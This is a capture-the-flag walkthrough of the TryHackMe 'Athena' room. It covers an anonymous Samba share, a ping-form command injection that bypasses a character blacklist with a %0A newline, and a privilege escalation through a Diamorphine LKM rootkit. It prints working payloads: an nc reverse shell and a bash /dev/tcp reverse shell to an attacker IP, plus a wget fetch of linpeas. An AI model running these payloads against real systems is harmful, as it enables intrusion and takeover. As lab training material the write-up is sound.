---
author: NotCare
pubDatetime: 2023-09-18T22:18:00Z
title: THM: Athena Writeup
postSlug: thm-athena-writeup
featured: true
draft: false
tags:
  - writeup
  - thm
ogImage: ""
description: Inspired by linux rootkits
---

## Abstract

Level: Medium<br>
Machine: Linux<br>
Link: [THM Room link](https://tryhackme.com/room/4th3n4)<br>
A room about web mis-configuration and reverse engineering a rootkit!<br>
Lets get into it

## Recon

Lets start off with our frontface, which is a custom made recon script specially made for THM and HTB<br>
[FrontFace Github](https://github.com/charfweh/frontface)

```bash
./frontface.sh [ip]
```

There are four ports open `22,80,139,445`
*[Image: image]*
*[Image: image]*

## Enumeration

### Webserver (Port 80)

Visiting the webpage we get
*[Image: image]*
A pretty static site, we can try gobuster but it doesnt result anything interesting either

### Samba (Port 139,445)

Trying samba to list shares with null password we get,

```bash
smbclient -N -L 10.10.143.147
```

*[Image: image]*
We find a share `public`, lets access it and give it no password

```bash
smbclient //10.10.143.147/public
```

*[Image: image]*
Let's read the file and we find a potential route `/myrouterpanel`
*[Image: image]*

### Myrouterpanel

Visiting the page we get,
*[Image: image]*
and we find its pinging utility service from the web, what this means is the server is probably running `ping` on the server machine, which hints us with `command injection` vulnerability
Lets fire up burp to see whats going on
*[Image: image]*
payload`;id;`, and we get response as `Attemp Hacking`, so theres some filters on the server.<br>
Looking through [command injection payloads](https://github.com/payloadbox/command-injection-payload-list) from github, we find one particular payload to be working `%0Aid` out of which `%0A` is a newline feed in hex, trying the payload
payload `ip=127.0.0.1%0Aid%0A&submit=`
*[Image: image]*
and we get code execution! alright next up is we look at the file so we can see what filters are there
payload `ip=127.0.0.1%0Acat+ping.php%0A&submit=`

- **Snipped output**

```php
function containsMaliciousCharacters($input) {
    // Define the set of characters to check for
    $maliciousChars = array(';', '&', '|');

    // Check if any of the malicious characters exist in the input
    foreach ($maliciousChars as $char) {
        if (stripos($input, $char) !== false) {
            return true;
        }
    }

    return false;
}
```

so we see the blacklisted characters.
Lets try to get a shell on the box
start a listener on `nc -lnvp 4242`

- Payload

```bash
ip=127.0.0.1%0Anc+10.17.55.0+4242+-e+/bin/sh&submit=`
```

*[Image: image]*
and we get a hit, lets stabilize the shell to get a fully interactive pty shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z to bg
stty raw -echo; fg
Press enter to get back on the shell
export TERM=xterm
```

## Initial foothold

### www-data

Looking at available users we get
*[Image: image]*
we see there are three users, now lets run linpeas.sh to look for any potential privesc vector

```bash
Attacker Machine:
python3 -m http.server 8001
Target Machine:
wget attacker_ip:8001/linpeas.sh
chmod +x linpeas.sh
./linpeash.sh
```

Running linpeas we find one interesting service running
*[Image: image]*
Lets check the service
`cat /etc/systemd/system/athena_backup.service`

*[Image: image]*`so its running backup service every 1 minute, lets check backup.sh`cat /usr/share/backup/backup.sh`
*[Image: image]*
Checking the permission on the file we see its writable
*[Image: image]*
so we could potentially write a reverse shell and let it run

### www-data to athena

Editing the file with our revshell payload

```bash
bash -i >& /dev/tcp/10.17.55.0/9001 0>&1
```

*[Image: image]*
make sure to overwrite it and start a listener on attacking machine
and we get a shell as athena!

- you can find **user.txt** in /home/athena
  *[Image: image]*

## Privesc

### Ghidra

After looking at `sudo -l` we see theres a binary runnable by root, lets get the binary on our machine to analyze it in ghidra

```bash
Target machine:
python3 -m http.server 8001
Attacking machine:
wget targetip:8001/venom.ko
```

Lets fire up ghidra and see whats it about
Make sure to analyze the binary as asked in the popup
Looking at the available functions we have
*[Image: image]*
hmm, interesting, you can go ahead and look at all the functions and whats it doing
okay now lets check for strings
*[Image: image]*
looking at the strings, we can see the description says `LKM rootkit` and author `m0nad`, so we know were dealing with a rootkit, lets search what its about

### LKM rookit m0nad

Doing a quick google search `lkm rootkit m0nad` we find a github repo for https://github.com/m0nad/Diamorphine and we know we had a function called `diamorphine_cleaup` and `diamorphine_init`, so chances are its the same.

### what is a rootkit?

```markdown
The term rootkit is a connection of the two words "root" and "kit." Originally, a rootkit was **a collection of tools that enabled administrator-level access to a computer or network**
_Check Reference for more reading_
```

### what is diamorphine rootkit?

```markdown
Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64
_Check Reference for more reading_
```

### what is it doing?

so looking at the github readme, we get to know its capable of doing of some interesting things like

```markdown
- When loaded, the module starts invisible;
- Hide/unhide any process by sending a signal 31;
- Sending a signal 63(to any pid) makes the module become (in)visible;
- Sending a signal 64(to any pid) makes the given user become root;
- Files or directories starting with the MAGIC_PREFIX become invisible;
- Source: (https://github.com/m0nad/Diamorphine)
```

out of which `sending a signal 64 gives us root` is more interesting, lets try to weaponize it.

### athena to root

so we have a rootkit, follow the steps carefully

- `Load the rootkit`

```bash
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
insmod: inserts kernel modules
```

*[Image: image]*

- check if its loaded

```
dmesg: displays kernel related modules
```

**snipped output**
*[Image: image]*

- get root by sending a signal to 64 with any pid
  *[Image: image]*
  oh wait, we get operation not permitted? hmm lets go back and look at the functions

### hacked_kill function

You can check the `function graph` to get a detailed view of how the functions are being called and when

*[Image: image]*
Looking at the function we can see if `ivar3==0x39` call `give_root()`
and `0x39` is `57` in decimal, so this means the `SIGNAL` it wants to give root is `57`

- Lets send a kill signal with 57 and with any pid

```bash
kill -57 0
```

- check id

```bash
id
```

and we get root!
*[Image: image]*

- you can find the root.txt in /root

## References

- Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
- LKM: https://en.wikipedia.org/wiki/Loadable_kernel_module
- LKM rootkit: https://www.giac.org/paper/gsec/935/kernel-rootkits/101864
- Linux LKM rootkit: https://www.youtube.com/watch?v=hsk450he7nI

Thanks for reading!!
